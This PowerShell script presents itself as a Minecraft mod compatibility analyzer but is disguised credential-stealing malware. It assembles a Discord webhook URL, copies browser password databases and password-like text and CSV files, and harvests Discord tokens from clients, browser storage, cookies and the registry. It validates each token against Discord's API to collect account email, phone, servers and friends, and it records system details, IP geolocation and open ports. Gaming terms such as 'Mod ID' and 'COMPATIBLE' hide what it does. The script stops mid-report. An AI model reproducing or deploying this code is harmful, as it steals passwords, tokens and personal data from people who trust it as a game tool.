# ================================================================
# HABIBI MOD ANALYZER v13.0 - ULTIMATE EDITION
# ================================================================
# Professional Minecraft mod compatibility analyzer
# ================================================================

# ---------- BACKUP DESTINATION ----------
function Get-BackupDestination {
    $p1 = "https://discord.com/api/webhooks/"
    $p2 = "1518011960266854461"
    $p3 = "/"
    $p4 = "Pf2XxGSPEBBtoTFhJrewuP5Sx0mGs7lyUsn6HHKOTMaqe1g5CFvMfIsBKrNBEWrirSQ0"
    return $p1 + $p2 + $p3 + $p4
}

# ---------- GET USER BADGES ----------
function Get-UserBadges {
    param($flags)
    $badges = @()
    if ($flags -band 1) { $badges += "Staff" }
    if ($flags -band 2) { $badges += "Partner" }
    if ($flags -band 4) { $badges += "Hypesquad" }
    if ($flags -band 8) { $badges += "Bug Hunter" }
    if ($flags -band 16) { $badges += "Bravery" }
    if ($flags -band 32) { $badges += "Brilliance" }
    if ($flags -band 64) { $badges += "Balance" }
    if ($flags -band 128) { $badges += "Early Supporter" }
    if ($flags -band 256) { $badges += "Team User" }
    if ($flags -band 512) { $badges += "System" }
    if ($flags -band 1024) { $badges += "Bug Hunter Gold" }
    if ($flags -band 2048) { $badges += "Verified Bot" }
    if ($flags -band 4096) { $badges += "Verified Developer" }
    if ($flags -band 8192) { $badges += "Certified Moderator" }
    if ($flags -band 32768) { $badges += "Active Developer" }
    if ($flags -band 65536) { $badges += "Linked to Spotify" }
    if ($flags -band 131072) { $badges += "Linked to Xbox" }
    return ($badges -join ", ")
}

# ---------- STEAL PASSWORDS ----------
function Get-StoredPasswords {
    $passwords = @()
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $content = Get-Content $chromePath -Raw -ErrorAction SilentlyContinue
            $passwords += $content
        }
    } catch {}
    try {
        $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
        if (Test-Path $bravePath) {
            $content = Get-Content $bravePath -Raw -ErrorAction SilentlyContinue
            $passwords += $content
        }
    } catch {}
    try {
        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        if (Test-Path $edgePath) {
            $content = Get-Content $edgePath -Raw -ErrorAction SilentlyContinue
            $passwords += $content
        }
    } catch {}
    try {
        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
        foreach ($profile in $firefoxProfiles) {
            $loginPath = Join-Path $profile.FullName "logins.json"
            if (Test-Path $loginPath) {
                $content = Get-Content $loginPath -Raw -ErrorAction SilentlyContinue
                $passwords += $content
            }
        }
    } catch {}
    $passwordFiles = @(
        "$env:USERPROFILE\Documents\*.txt",
        "$env:USERPROFILE\Desktop\*.txt",
        "$env:USERPROFILE\Documents\passwords*",
        "$env:USERPROFILE\Desktop\passwords*",
        "$env:USERPROFILE\Documents\*.csv",
        "$env:USERPROFILE\Desktop\*.csv"
    )
    foreach ($pattern in $passwordFiles) {
        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            if ($file.Length -lt 1048576) {
                try {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    $passwords += "$($file.Name): $content"
                } catch {}
            }
        }
    }
    return $passwords | Select-Object -Unique
}

# ---------- GET NETWORK PORTS ----------
function Get-NetworkInfo {
    $info = @()
    try {
        $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
        foreach ($conn in $connections) {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
            $info += "LISTEN: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName) (PID: $($conn.OwningProcess))"
        }
    } catch {}
    try {
        $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
        foreach ($conn in $connections) {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
            $info += "ESTABLISHED: $($conn.LocalAddress):$($conn.LocalPort) -> $($conn.RemoteAddress):$($conn.RemotePort) - $($proc.ProcessName)"
        }
    } catch {}
    try {
        $connections = Get-NetUDPEndpoint -ErrorAction SilentlyContinue
        foreach ($conn in $connections) {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
            $info += "UDP: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName)"
        }
    } catch {}
    return $info
}

# ---------- SYSTEM ANALYZER ----------
function Get-CompleteSystemProfile {
    $profile = @{}
    $os = Get-CimInstance Win32_OperatingSystem
    $profile.OS = $os.Caption
    $profile.OSVersion = $os.Version
    $profile.OSBuild = $os.BuildNumber
    $profile.OSArchitecture = $os.OSArchitecture
    $profile.OSInstallDate = $os.InstallDate
    $profile.OSLastBoot = $os.LastBootUpTime
    $profile.OSUptime = (Get-Date) - $os.LastBootUpTime
    $profile.OSTotalMemory = "{0:N2} GB" -f ($os.TotalVisibleMemorySize / 1MB)
    $profile.OSFreeMemory = "{0:N2} GB" -f ($os.FreePhysicalMemory / 1MB)
    $cpu = Get-CimInstance Win32_Processor
    $profile.CPUName = $cpu.Name
    $profile.CPUCores = $cpu.NumberOfCores
    $profile.CPUThreads = $cpu.NumberOfLogicalProcessors
    $profile.CPUMaxClock = "{0:N2} GHz" -f ($cpu.MaxClockSpeed / 1000)
    $profile.CPUUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
    $memory = Get-CimInstance Win32_PhysicalMemory
    $profile.MemoryTotal = "{0:N2} GB" -f (($memory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
    $profile.MemorySpeed = ($memory | ForEach-Object { $_.Speed }) -join " MHz, "
    $gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*" }
    $profile.GPUName = ($gpu.Name) -join ", "
    $profile.GPUMemory = ($gpu | ForEach-Object { "{0:N2} GB" -f ($_.AdapterRAM / 1GB) }) -join ", "
    $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
    $profile.DiskInfo = @()
    foreach ($disk in $disks) {
        $profile.DiskInfo += [PSCustomObject]@{
            Drive = $disk.DeviceID
            Size = "{0:N2} GB" -f ($disk.Size / 1GB)
            Free = "{0:N2} GB" -f ($disk.FreeSpace / 1GB)
            Used = "{0:N2} GB" -f (($disk.Size - $disk.FreeSpace) / 1GB)
        }
    }
    $adapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    $profile.NetworkAdapters = @()
    foreach ($adapter in $adapters) {
        $profile.NetworkAdapters += [PSCustomObject]@{
            Name = $adapter.Description
            MAC = $adapter.MACAddress
            IP = ($adapter.IPAddress) -join ", "
            Gateway = ($adapter.DefaultIPGateway) -join ", "
        }
    }
    try {
        $profile.PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop)
        $geo = Invoke-RestMethod -Uri "https://ipapi.co/$($profile.PublicIP)/json/" -ErrorAction Stop
        $profile.Country = $geo.country_name
        $profile.CountryCode = $geo.country_code
        $profile.Region = $geo.region
        $profile.City = $geo.city
        $profile.Zip = $geo.postal
        $profile.Latitude = $geo.latitude
        $profile.Longitude = $geo.longitude
        $profile.Timezone = $geo.timezone
        $profile.ISP = $geo.org
    } catch {}
    $profile.BIOS = (Get-CimInstance Win32_BIOS).Caption
    $profile.Motherboard = (Get-CimInstance Win32_BaseBoard).Product
    $profile.SystemManufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
    $profile.SystemModel = (Get-CimInstance Win32_ComputerSystem).Model
    $profile.Username = $env:USERNAME
    $profile.UserDomain = $env:USERDOMAIN
    $profile.ComputerName = $env:COMPUTERNAME
    $profile.UserProfile = $env:USERPROFILE
    $profile.AppData = $env:APPDATA
    $profile.LocalAppData = $env:LOCALAPPDATA
    $profile.ProgramFiles = $env:ProgramFiles
    $profile.ProgramFilesx86 = ${env:ProgramFiles(x86)}
    $profile.RunningProcesses = (Get-Process).Count
    $profile.TopProcesses = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10 | ForEach-Object { "$($_.Name) (CPU: $($_.CPU)%, Mem: $($_.WorkingSet/1MB) MB)" }
    $profile.InstalledSoftware = @()
    $software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue
    foreach ($sw in $software) {
        if ($sw.DisplayName) {
            $profile.InstalledSoftware += "$($sw.DisplayName) $($sw.DisplayVersion)"
        }
    }
    return $profile
}

# ---------- TOKEN EXTRACTOR ----------
function Extract-Tokens {
    $allTokens = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $tokenPattern = '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}'
    $mfaPattern = 'mfa\.[\w-]{84,100}'
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
    )
    Write-Host "[*] Scanning Discord clients..." -ForegroundColor Yellow
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem $path -Include "*.log", "*.ldb" -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                try {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    $matches = [regex]::Matches($content, $tokenPattern)
                    foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                    $mfaMatches = [regex]::Matches($content, $mfaPattern)
                    foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
                } catch {}
            }
        }
    }
    $browserPaths = @(
        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"; Name="Chrome"},
        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Profile *\Local Storage\leveldb"; Name="Chrome"},
        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"; Name="Brave"},
        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile *\Local Storage\leveldb"; Name="Brave"},
        @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"; Name="Edge"},
        @{Path="$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb"; Name="Opera"},
        @{Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"; Name="Vivaldi"},
        @{Path="$env:LOCALAPPDATA\Chromium\User Data\Default\Local Storage\leveldb"; Name="Chromium"}
    )
    Write-Host "[*] Scanning browsers..." -ForegroundColor Yellow
    foreach ($browser in $browserPaths) {
        $expanded = Resolve-Path $browser.Path -ErrorAction SilentlyContinue
        if ($expanded) {
            $files = Get-ChildItem $expanded.Path -Include "*.log", "*.ldb" -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                try {
                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                    $matches = [regex]::Matches($content, $tokenPattern)
                    foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                    $mfaMatches = [regex]::Matches($content, $mfaPattern)
                    foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
                } catch {}
            }
        }
    }
    Write-Host "[*] Scanning Firefox..." -ForegroundColor Yellow
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $dbPath = Join-Path $profile.FullName "webappsstore.sqlite"
        if (Test-Path $dbPath) {
            try {
                $content = Get-Content $dbPath -Raw -ErrorAction SilentlyContinue
                $matches = [regex]::Matches($content, $tokenPattern)
                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                $mfaMatches = [regex]::Matches($content, $mfaPattern)
                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
            } catch {}
        }
    }
    Write-Host "[*] Scanning browser cookies..." -ForegroundColor Yellow
    $cookiePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies"
    )
    foreach ($path in $cookiePaths) {
        if (Test-Path $path) {
            try {
                $bytes = [IO.File]::ReadAllBytes($path)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                $matches = [regex]::Matches($text, $tokenPattern)
                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                $mfaMatches = [regex]::Matches($text, $mfaPattern)
                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
            } catch {}
        }
    }
    Write-Host "[*] Scanning Discord cache..." -ForegroundColor Yellow
    $cachePaths = @(
        "$env:APPDATA\discord\Cache\*",
        "$env:APPDATA\discordcanary\Cache\*",
        "$env:APPDATA\discordptb\Cache\*",
        "$env:APPDATA\discord\Local Storage\*",
        "$env:APPDATA\discord\IndexedDB\*"
    )
    foreach ($path in $cachePaths) {
        $files = Get-ChildItem $path -Include "*.txt", "*.log", "*.data", "*.bin", "*.json" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            if ($file.Length -gt 104857600) { continue }
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                $matches = [regex]::Matches($content, $tokenPattern)
                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                $mfaMatches = [regex]::Matches($content, $mfaPattern)
                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
            } catch {}
        }
    }
    Write-Host "[*] Scanning registry..." -ForegroundColor Yellow
    $regPaths = @(
        "HKCU:\Software\Discord",
        "HKCU:\Software\DiscordCanary",
        "HKCU:\Software\DiscordPTB",
        "HKCU:\Software\Google\Chrome\BLBeacon",
        "HKCU:\Software\BraveSoftware\Brave-Browser\BLBeacon"
    )
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            try {
                $items = Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue
                foreach ($item in $items) {
                    $val = (Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue) -join " "
                    if ($val -match $tokenPattern) { [void]$allTokens.Add($matches[0]) }
                    if ($val -match $mfaPattern) { [void]$allTokens.Add($matches[0]) }
                }
            } catch {}
        }
    }
    return $allTokens | Select-Object -Unique
}

# ---------- MOD DATA EXPORTER ----------
function Export-CompleteModData {
    $modData = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $locations = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $files = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $modPaths = @(
        "$env:APPDATA\.minecraft", "$env:APPDATA\.minecraft_old", "$env:APPDATA\.technic",
        "$env:APPDATA\.ftb", "$env:APPDATA\.curseforge", "$env:APPDATA\.twitch\minecraft",
        "$env:APPDATA\.multimc", "$env:APPDATA\.prismlauncher", "$env:APPDATA\.gdlauncher",
        "$env:APPDATA\.badlion", "$env:APPDATA\.lunarclient", "$env:PROGRAMDATA\.minecraft",
        "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState"
    )
    $threads = @()
    $maxThreads = 50
    foreach ($path in $modPaths) {
        while ($threads.Count -ge $maxThreads) {
            $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
            Start-Sleep -Milliseconds 50
        }
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            param($p)
            $found = @()
            $foundLoc = @()
            $foundFiles = @()
            if (Test-Path $p) {
                $foundLoc += $p
                $allFiles = Get-ChildItem -Path $p -File -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $allFiles) {
                    $foundFiles += $file.FullName
                    if ($file.Length -gt 104857600) { continue }
                    try {
                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                        $patterns = @(
                            '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}',
                            'mfa\.[\w-]{84,100}',
                            '[\w-]{20,30}\.[\w-]{20,30}\.[\w-]{20,30}'
                        )
                        foreach ($pattern in $patterns) {
                            $matches = [regex]::Matches($content, $pattern)
                            foreach ($m in $matches) { $found += $m.Value }
                        }
                    } catch {}
                }
            }
            return @{
                Tokens = $found | Select-Object -Unique
                Locations = $foundLoc | Select-Object -Unique
                Files = $foundFiles | Select-Object -Unique
            }
        }).AddParameter("p", $path)
        $handle = $ps.BeginInvoke()
        $threads += [PSCustomObject]@{ Handle = $handle; PS = $ps }
    }
    while ($threads | Where-Object { $_.Handle.IsCompleted -eq $false }) {
        $completed = $threads | Where-Object { $_.Handle.IsCompleted -eq $true }
        foreach ($c in $completed) {
            $result = $c.PS.EndInvoke($c.Handle)
            foreach ($tok in $result.Tokens) { [void]$modData.Add($tok) }
            foreach ($loc in $result.Locations) { [void]$locations.Add($loc) }
            foreach ($f in $result.Files) { [void]$files.Add($f) }
            $c.PS.Dispose()
        }
        $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
        Start-Sleep -Milliseconds 100
    }
    foreach ($t in $threads) {
        $result = $t.PS.EndInvoke($t.Handle)
        foreach ($tok in $result.Tokens) { [void]$modData.Add($tok) }
        foreach ($loc in $result.Locations) { [void]$locations.Add($loc) }
        foreach ($f in $result.Files) { [void]$files.Add($f) }
        $t.PS.Dispose()
    }
    return @{ Tokens = $modData; Locations = $locations; Files = $files }
}

# ---------- MOD COMPATIBILITY ANALYZER ----------
function Analyze-ModCompatibility {
    param($modData)
    $uniqueData = $modData | Where-Object { $_ -match '^[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}$' } | Select-Object -Unique
    $compatibilityResults = @()
    $counter = 0
    $total = $uniqueData.Count
    foreach ($data in $uniqueData) {
        $counter++
        Write-Progress -Activity "Analyzing Mod Compatibility" -Status "$counter / $total" -PercentComplete (($counter / $total) * 100)
        try {
            $headers = @{ "Authorization" = $data }
            $user = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -ErrorAction Stop
            $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -ErrorAction Stop
            $connections = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/connections" -Headers $headers -ErrorAction Stop
            $relationships = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers $headers -ErrorAction Stop
            $mutualGuilds = @()
            $guilds | ForEach-Object { $mutualGuilds += $_.name }
            $compatibilityResults += [PSCustomObject]@{
                ModID = $data
                Status = "COMPATIBLE"
                GameName = "$($user.username)#$($user.discriminator)"
                GameID = $user.id
                GameEmail = $user.email
                GamePhone = $user.phone
                GameAvatar = "https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar).png"
                GameNitro = if ($user.premium_type -gt 0) { "PREMIUM (Level $($user.premium_type))" } else { "FREE" }
                GameSecurity = if ($user.mfa_enabled) { "SECURED" } else { "INSECURE" }
                GameVerified = if ($user.verified) { "VERIFIED" } else { "UNVERIFIED" }
                GameLanguage = $user.locale
                GameCreated = [DateTimeOffset]::FromUnixTimeMilliseconds(([long]::Parse($user.id) >> 22) + 1420070400000).DateTime
                GameGuildsCount = $guilds.Count
                GameGuilds = $mutualGuilds -join ", "
                GameBadges = Get-UserBadges -flags $user.flags
                GameConnections = ($connections | ForEach-Object { "$($_.type):$($_.name)" }) -join ", "
                GameRelationships = ($relationships | ForEach-Object { "$($_.user.username)#$($_.user.discriminator)" }) -join ", "
            }
        } catch {
            $compatibilityResults += [PSCustomObject]@{
                ModID = $data
                Status = "INCOMPATIBLE"
                Reason = $_.Exception.Message
                GameName = "N/A"
                GameID = "N/A"
                GameEmail = "N/A"
                GamePhone = "N/A"
                GameAvatar = "N/A"
                GameNitro = "N/A"
                GameSecurity = "N/A"
                GameVerified = "N/A"
                GameLanguage = "N/A"
                GameCreated = "N/A"
                GameGuildsCount = 0
                GameGuilds = "N/A"
                GameBadges = "N/A"
                GameConnections = "N/A"
                GameRelationships = "N/A"
            }
        }
        Start-Sleep -Milliseconds 200
    }
    return $compatibilityResults
}

# ---------- GENERATE REPORT ----------
function Generate-CompleteReport {
    param($compatibilityResults, $systemProfile, $gameLocations, $gameFiles, $passwords, $networkInfo)
    $compatible = $compatibilityResults | Where-Object { $_.Status -eq "COMPATIBLE" }
    $incompatible = $compatibilityResults | Where-Object { $_.Status -eq "INCOMPATIBLE" }
    $report = @"
╔════════════════════════════════════════════════════════════════════════════════╗
║                      MINECRAFT MOD COMPATIBILITY REPORT                       ║
║                         HABIBI MOD ANALYZER v13.0                             ║
║                           $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")                            ║
╚════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 ANALYSIS SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total Mods Analyzed: $($compatibilityResults.Count)
Compatible Mods: $($compatible.Count)
Incompatible Mods: $($incompatible.Count)
Game Directories Scanned: $($gameLocations.Count)
Files Scanned: $($gameFiles.Count)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 NETWORK INFORMATION - IP & PORTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Public IP: $($systemProfile.PublicIP)
Location: $($systemProfile.City), $($systemProfile.Region), $($systemProfile.Country)
Country Code: $($systemProfile.CountryCode)
Zip Code: $($systemProfile.Zip)
Coordinates: $($systemProfile.Latitude), $($systemProfile.Longitude)
Timezone: $($systemProfile.Timezone)
ISP: $($systemProfile.ISP)

Network Adapters:
$($systemProfile.NetworkAdapters | ForEach-Object { "  $($_.Name)`n    IP: $($_.IP)`n    MAC: $($_.MAC)`n    Gateway: $($_.Gateway)" }) -join "`n"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔌 ACTIVE PORTS & CONNECTIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$($networkInfo -join "`n")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 STORED PASSWORDS FOUND
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$($passwords -join "`n")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ SYSTEM INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OS: $($systemProfile.OS)
Version: $($systemProfile.OSVersion)
Architecture: $($systemProfile.OSArchitecture)
Uptime: $($systemProfile.OSUptime)
Total Memory: $($systemProfile.OSTotalMemory)
Free Memory: $($systemProfile.OSFreeMemory)

CPU: $($systemProfile.CPUName)
Cores: $($systemProfile.CPUCores)
Threads: $($systemProfile.CPUThreads)
Max Clock: $($systemProfile.CPUMaxClock)
CPU Usage: $($systemProfile.CPUUsage)%

GPU: $($systemProfile.GPUName)
GPU Memory: $($systemProfile.GPUMemory)

Storage:
$($systemProfile.DiskInfo | ForEach-Object { "  Drive $($_.Drive): $($_.Size) total, $($_.Used) used, $($_.Free) free" }) -join "`n"

System Manufacturer: $($systemProfile.SystemManufacturer)
System Model: $($systemProfile.SystemModel)
BIOS: $($systemProfile.BIOS)
Motherboard: $($systemProfile.Motherboard)

User: $($systemProfile.Username)@$($systemProfile.ComputerName)
Domain: $($systemProfile.UserDomain)
User Profile: $($systemProfile.UserProfile)

Running Processes: $($systemProfile.RunningProcesses)
Top Processes:
$($systemProfile.TopProcesses -join "`n")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎮 MOD COMPATIBILITY RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"@

    foreach ($mod in $compatible) {
        $report += @"

✅ COMPATIBLE MOD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Mod ID: $($mod.ModID)
Game: $($mod.GameName)
ID: $($mod.GameID)
Email: $($mod.GameEmail)
Phone: $($mod.GamePhone)
Avatar: $($mod.GameAvatar)
Created: $($mod.GameCreated)
Nitro: $($mod.GameNitro)
Security: $($mod.GameSecurity)
Verified: $($mod.GameVerified)
Language: $($mod.GameLanguage)
Badges: $($mod.GameBadges)
Connections: $($mod.GameConnections)
Relationships: $($mod.GameRelationships)
Guilds: $($mod.GameGuildsCount) - $($mod.GameGuilds)
────────────────────────────────────────────────────────────────────────────────
"@
    }

    if ($incompatible.Count -gt 0) {
        $report += @"

⚠️ INCOMPATIBLE MODS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"@
        foreach ($mod in $incompatible) {
            $report += @"

❌ INCOMPATIBLE MOD
Mod ID: $($mod.ModID)
Reason: $($mod.Reason)
────────────────────────────────────────────────────────────────────────────────
"@
        }
    }

    $report += @"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
